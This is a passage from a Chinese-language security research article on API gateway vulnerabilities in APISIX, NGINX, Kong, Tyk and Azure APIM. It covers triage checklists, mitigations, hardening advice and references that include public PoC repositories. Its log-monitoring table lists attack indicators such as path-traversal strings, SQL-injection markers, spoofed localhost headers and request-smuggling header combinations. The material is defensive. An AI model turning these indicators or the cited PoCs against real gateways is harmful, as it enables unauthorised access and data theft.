| CVE-2023-42283 | 统计 API 无认证 | SQL 注入 |
| CVE-2021-45232 | 内部管理 API 暴露 | 未授权访问 |

**共性特征**：API 网关产品在版本迭代过程中，旧版本的管理 API 和内部端点往往未被完全清理或禁用。这些遗留端点可能缺少新版本中引入的安全控制（认证、授权、输入验证），成为攻击者绕过安全机制的通道。

**防御建议**：建立 API 版本生命周期管理机制，对废弃版本的端点及时下线，定期扫描所有暴露的 API 端点并验证其安全控制，实施 API 资产清单管理。

---

## 0x09 应急排查与防守建议

### 紧急排查清单

当发现组织使用了本专题涉及的 API 网关产品时，应按以下优先级进行排查：

| 优先级 | 排查项 | 涉及产品 | 排查方法 |
|---|---|---|---|
| P0 | 确认是否使用默认 Admin Key | APISIX | 检查 `config.yaml` 中的 `admin_key` |
| P0 | 确认 Admin API 端口暴露情况 | APISIX | 检查 9180 端口是否绑定到公网 |
| P0 | 确认 batch-requests 插件状态 | APISIX | 检查 `apisix/config.yaml` 中的 `plugins` 列表 |
| P1 | 确认 Dashboard 是否暴露 | APISIX | 检查 9000 端口是否绑定到公网 |
| P1 | 确认 HTTP/2 和 HTTP/3 启用情况 | NGINX | 检查 `nginx.conf` 中的 `http2` 和 `quic` 配置 |
| P1 | 确认 gRPC 上游配置 | NGINX | 检查 `proxy_http_version` 和 `grpc_pass` 配置 |
| P2 | 确认 Tyk 统计 API 暴露 | Tyk | 检查 `/api/errors/count/` 端点是否公开可访问 |
| P2 | 确认 Kong JWT 插件配置 | Kong | 检查是否存在混合认证/公开路由 |
| P3 | 审计 Azure APIM CORS/Hosting Proxy | Azure APIM | 检查 Azure Policy 合规状态 |

### 日志关键字段表

在排查和监控 API 网关安全事件时，应重点关注以下日志字段：

| 日志字段 | 关注值 | 异常含义 |
|---|---|---|
| `X-REAL-IP` / `X-Forwarded-For` | `127.0.0.1` / `::1` | 可能的 IP 限制绕过尝试 |
| `request_path` | 包含 `../` 或 `..%2f` | 路径穿越攻击尝试 |
| `request_path` | `/api/batch-requests` | APISIX batch-requests 利用尝试 |
| `api_errors_count` 参数 | 包含 `'` 或 `UNION` | SQL 注入尝试 |
| `Authorization` header | 格式异常或为空 | 认证绕过尝试 |
| `Transfer-Encoding` | `chunked` + `Content-Length` 同时存在 | HTTP 请求走私尝试 |
| `worker_connections` 告警 | 连接数异常飙升 | HTTP/2 Rapid Reset DoS |
| `status_code` | 连续 401 后突然 200 | 认证绕过成功 |
| `upstream_response_time` | 异常高延迟 | 协议级攻击或资源耗尽 |

### 紧急缓解措施

| 漏洞类型 | 缓解措施 | 实施难度 |
|---|---|---|
| 默认配置滥用 | 修改所有默认密钥，限制 Admin API 端口到内网 | 低 |
| IP 限制绕过 | 禁用 batch-requests 插件或配置前置防火墙 | 低 |
| 认证绕过 | 在 API 网关前部署独立的认证层（如 OAuth2 Proxy） | 中 |
| SQL 注入 | 升级 Tyk 至 5.0.7+，对统计 API 增加认证 | 低 |
| HTTP/2 DoS | 限制单连接最大并发流数（`max_concurrent_streams`） | 中 |
| HTTP/3 UAF | 禁用 HTTP/3 QUIC 模块或升级至 1.31.2+ | 低 |
| gRPC 溢出 | 升级 NGINX 至已修复版本，禁用非必要 gRPC 上游 | 低 |
| SSRF | 配置 Azure Policy 禁用 CORS Proxy 的内网访问 | 中 |
| 权限提升 | 审计所有 APIM 相关的 IAM 角色绑定 | 中 |

### 长期安全加固建议

1. **版本管理**：建立 API 网关组件的版本追踪清单，订阅所有相关产品的安全公告邮件列表（Apache、Kong、NGINX、F5、Google Cloud、Microsoft）
2. **安全基线**：为每个 API 网关产品建立安全配置基线（CIS Benchmark 风格），并定期进行合规审计
3. **最小权限**：API 网关的管理接口、内部统计 API 和调试端点均应实施认证和最小权限控制
4. **网络隔离**：管理端口（APISIX 9180、Dashboard 9000）不应暴露到公网，应通过 VPN 或内网访问
5. **WAF 防护**：在 API 网关前部署 WAF，对 HTTP 请求走私、路径穿越、SQL 注入等常见攻击进行拦截
6. **监控告警**：配置 API 网关的访问日志和错误日志监控，对异常模式（如高频 401、批量路径穿越、异常请求头）进行实时告警
7. **定期渗透测试**：至少每季度对 API 网关进行一次安全评估，重点关注插件配置、默认凭据和暴露端点
8. **供应链安全**：对 API 网关的插件和依赖库进行安全扫描，确保使用的第三方组件无已知漏洞

---

## 0x0A 参考资料

1. Apache APISIX CVE-2022-24112 安全公告 — `https://apisix.apache.org/blog/2022/01/27/cve-2022-24112/`
2. Apache APISIX CVE-2022-29266 安全公告 — `https://apisix.apache.org/blog/2022/06/27/cve-2022-29266/`
3. CVE-2022-24112 GitHub PoC (M4xSec) — `https://github.com/M4xSec/Apache-APISIX-CVE-2022-24112`
4. CVE-2023-42283 GitHub PoC (andreysanyuk) — `https://github.com/andreysanyuk/CVE-2023-42283`
5. GatewayToHeaven: Apigee-X Cross-Tenant Data Access — `https://omeramiad.com/` / `https://focalsecurity.io/`
6. Azure API Management 漏洞分析 — Tenable Research Blog, Orca Security Blog
7. CVE-2023-44487 HTTP/2 Rapid Reset — Google Cloud Blog, `https://cloud.google.com/blog/products/identity-security/throttling-http-2-based-ddos-attacks`
8. NGINX 安全公告 — `https://nginx.org/en/security_advisories.html`
9. CISA 已知被利用漏洞目录 (KEV) — `https://www.cisa.gov/known-exploited-vulnerabilities-catalog`
10. NIST NVD 漏洞数据库 — `https://nvd.nist.gov/`
11. Vicarius CVE-2021-45232 分析 — Vicarius Research Blog
12. Nuclei 模板仓库 — `https://github.com/projectdiscovery/nuclei-templates`